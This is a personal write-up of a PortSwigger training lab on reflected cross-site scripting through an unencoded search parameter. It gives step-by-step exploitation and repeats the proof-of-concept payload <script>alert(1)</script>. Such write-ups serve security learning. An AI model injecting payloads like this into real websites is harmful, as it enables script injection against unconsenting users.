# Lab01 - Reflected XSS Into HTML Context With Nothing Encoded

## Objective

Perform a Reflected XSS attack that executes JavaScript inside the search functionality.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | XSS |
| Difficulty | Apprentice |
| Vulnerability | Reflected XSS |
| Context | HTML Context |
| Platform | PortSwigger |

---

# Vulnerability Overview

The search functionality reflects user input directly into the HTML response without encoding.

This allows arbitrary JavaScript execution.

---

# Analysis

## Step 1

Search for:

```text
test
```

---

URL becomes:

```http
https://LAB-ID.web-security-academy.net/?search=test
```

---

## Step 2

Observe response:

```html
<p>You searched for: test</p>
```

Input is reflected.

---

## Step 3

Test XSS payload.

---

# Full Payload(s) Used

## Final Payload

```html
<script>alert(1)</script>
```

---

# Exploitation Steps

### Step 1

Open search functionality.

---

### Step 2

Enter:

```html
<script>alert(1)</script>
```

---

### Step 3

Submit search.

---

### Step 4

Browser executes:

```javascript
alert(1)
```

---

### Step 5

Lab solved.

---

# Why The Payload Works

Application performs:

```text
Input
        ↓
Direct Reflection
        ↓
HTML Response
```

without:

```text
Encoding
Filtering
Sanitization
```

Browser interprets:

```html
<script>
```

as executable code.

---

# Personal Analysis & Testing Process

## Observation

Input appeared directly in page output.

---

## Initial Test

Submitted:

```text
test
```

to confirm reflection.

---

## Payload Selection

Because reflection occurred inside:

```text
HTML Context
```

simple payload chosen:

```html
<script>alert(1)</script>
```

---

## Result

JavaScript executed immediately.

Lab solved.

---

# Related Theory

- 06-reflected-xss.md
- 08-reflected-xss-contexts.md

---

# Key Learnings

- Always confirm reflection first.
- Context determines payload.
- HTML context is often the easiest XSS context.